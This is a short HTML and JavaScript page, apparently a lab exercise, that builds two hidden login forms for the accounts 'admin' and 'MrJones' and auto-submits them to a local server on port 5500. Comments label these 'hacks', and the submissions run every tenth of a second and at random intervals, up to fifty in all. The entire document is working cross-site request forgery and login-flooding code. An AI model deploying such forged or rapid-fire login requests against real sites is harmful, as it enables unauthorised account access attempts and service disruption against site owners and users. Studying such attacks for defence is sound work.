<form id="hack" target="csrf-frame" action="http://localhost:5500/" method="POST" autocomplete="off">
    <input name="username" value="admin">
    <input name="password" value="x">
</form>
<form id="hack2" target="csrf-frame" action="http://localhost:5500/" method="POST" autocomplete="off">
    <input name="username" value="MrJones">
    <input name="password" value="x">
</form>
<script>
let count = 0; //stop after 50 total submissions
function submitHack() {
    if (count >= 50) return;
    count++;
    document.getElementById("hack").submit();
    setTimeout(submitHack, 100); //Hack is submitted every 0.1 seconds
}
function timeHack2() {
    if (count >= 50) return;
    let time = Math.floor(Math.random() * 100);
    setTimeout(submitHack2, time); //Hack is submitted randomly every 0 to 0.1 seconds
    setTimeout(timeHack2, time+1); // reschedule hack attempt
}
function submitHack2() {
    if (count >= 50) return;
    count++;
    document.getElementById("hack2").submit();
}
submitHack();
timeHack2();
</script>
